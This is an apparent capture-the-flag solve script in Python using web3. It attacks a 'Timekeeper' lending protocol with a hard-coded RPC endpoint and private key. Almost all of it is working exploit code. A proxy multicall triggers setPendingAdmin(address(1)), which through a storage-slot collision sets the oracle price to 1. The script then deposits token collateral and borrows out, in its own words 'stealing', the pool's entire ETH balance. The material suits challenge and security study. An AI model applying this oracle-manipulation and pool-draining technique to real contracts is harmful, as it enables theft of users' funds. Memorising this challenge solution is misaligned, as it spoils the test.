#!/usr/bin/env python3
from web3 import Web3
from eth_account import Account
import time

RPC_URL = "http://34.2.147.230:8503/52cf879f-6b23-4992-b633-ab9ee77d48cf"
PRIVKEY = "8e8a43071346811041fbfe8aabaf41c97d2efdc1810c01f40f74c519117d7852"
SETUP = Web3.to_checksum_address("0xD342ce8Cc9f65AaDa74Baf455975E3c86A29DCA5")
PLAYER = Web3.to_checksum_address("0xA4F8c22C65058bEe18a43Fe8959A5471fA3Fe94a")

w3 = Web3(Web3.HTTPProvider(RPC_URL, request_kwargs={"timeout": 10}))
acct = Account.from_key(PRIVKEY)

assert acct.address.lower() == PLAYER.lower(), f"wrong key: {acct.address}"
assert w3.is_connected(), "RPC unreachable"

# Minimal ABIs
SETUP_ABI = [
    {
        "inputs": [],
        "name": "token",
        "outputs": [{"internalType": "contract TimekeeperToken", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "oracle",
        "outputs": [{"internalType": "contract TimekeeperOracle", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "proxy",
        "outputs": [{"internalType": "contract TimekeeperProxy", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "lending",
        "outputs": [{"internalType": "contract TimekeeperLending", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "governance",
        "outputs": [{"internalType": "contract TimekeeperGovernance", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function",
    },
]
TOKEN_ABI = [
    {
        "inputs": [{"name": "account", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"type": "uint256"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [
            {"name": "spender", "type": "address"},
            {"name": "amount", "type": "uint256"},
        ],
        "name": "approve",
        "outputs": [{"type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function",
    },
]

PROXY_ABI = [
    {
        "inputs": [{"name": "data", "type": "bytes[]"}],
        "name": "multicall",
        "outputs": [{"name": "results", "type": "bytes[]"}],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "pendingAdmin",
        "outputs": [{"type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "admin",
        "outputs": [{"type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "getLatestPrice",
        "outputs": [{"type": "uint256"}],
        "stateMutability": "view",
        "type": "function",
    },
]

LENDING_ABI = [
    {
        "inputs": [{"name": "amount", "type": "uint256"}],
        "name": "depositToken",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [{"name": "amount", "type": "uint256"}],
        "name": "borrowETH",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "poolETHBalance",
        "outputs": [{"type": "uint256"}],
        "stateMutability": "view",
        "type": "function",
    },
]

setup = w3.eth.contract(SETUP, abi=SETUP_ABI)

token_addr = Web3.to_checksum_address(setup.functions.token().call())
proxy_addr = Web3.to_checksum_address(setup.functions.proxy().call())
lending_addr = Web3.to_checksum_address(setup.functions.lending().call())

token = w3.eth.contract(token_addr, abi=TOKEN_ABI)
proxy = w3.eth.contract(proxy_addr, abi=PROXY_ABI)
lending = w3.eth.contract(lending_addr, abi=LENDING_ABI)

print(f"[+] player : {acct.address}")
print(f"[+] token  : {token_addr}")
print(f"[+] proxy  : {proxy_addr}")
print(f"[+] lending: {lending_addr}")

print(f"[+] pool before: {w3.from_wei(lending.functions.poolETHBalance().call(), 'ether')} ETH")
print(f"[+] TKG balance: {w3.from_wei(token.functions.balanceOf(PLAYER).call(), 'ether')}")

nonce = w3.eth.get_transaction_count(PLAYER)
chain_id = w3.eth.chain_id

def send(fn):
    global nonce
    tx = fn.build_transaction({
        "from": PLAYER,
        "nonce": nonce,
        "chainId": chain_id,
        "gas": 500_000,
        "gasPrice": w3.eth.gas_price,
    })
    signed = acct.sign_transaction(tx)
    txh = w3.eth.send_raw_transaction(signed.raw_transaction)
    print(f"[>] tx: {txh.hex()}")
    rcpt = w3.eth.wait_for_transaction_receipt(txh)
    print(f"[+] status={rcpt.status} gas={rcpt.gasUsed}")
    if rcpt.status != 1:
        raise RuntimeError("transaction failed")
    nonce += 1
    return rcpt

# ------------------------------------------------------------
# EXPLOIT 1:
# proxy.multicall() -> internal self-call -> setPendingAdmin(address(1))
#
# Proxy slot2 = pendingAdmin
# Oracle slot2 = latestPrice
# Therefore latestPrice becomes uint160(address(1)) == 1
# ------------------------------------------------------------
set_pending_admin = w3.keccak(text="setPendingAdmin(address)")[:4] + \
    (1).to_bytes(32, "big")

send(proxy.functions.multicall([set_pending_admin]))

print(f"[+] pendingAdmin = {proxy.functions.pendingAdmin().call()}")
print(f"[+] oracle price via proxy = {proxy.functions.getLatestPrice().call()}")

assert int(proxy.functions.getLatestPrice().call()) == 1

# ------------------------------------------------------------
# EXPLOIT 2:
# Deposit all player's TKG as collateral.
# ------------------------------------------------------------
bal = token.functions.balanceOf(PLAYER).call()
assert bal > 0

send(token.functions.approve(lending_addr, bal))
send(lending.functions.depositToken(bal))

print("[+] TKG collateral deposited")

# ------------------------------------------------------------
# EXPLOIT 3:
# Borrow all ETH in the pool.
# At price=1:
# collateralValueInETH = tokenCollateral * 1e18 / 1
# => enormous borrowing capacity
# ------------------------------------------------------------
pool = lending.functions.poolETHBalance().call()
print(f"[+] stealing {w3.from_wei(pool, 'ether')} ETH")

send(lending.functions.borrowETH(pool))

time.sleep(1)

remaining = lending.functions.poolETHBalance().call()
solved = setup.functions.isSolved().call()

print(f"[+] pool after: {w3.from_wei(remaining, 'ether')} ETH")
print(f"[+] solved: {solved}")

if not solved:
    raise RuntimeError("Pool not drained")
print("\n[+] FLAG CONDITION TRIGGERED")
print("[+] Run the challenge checker / submit normally.")
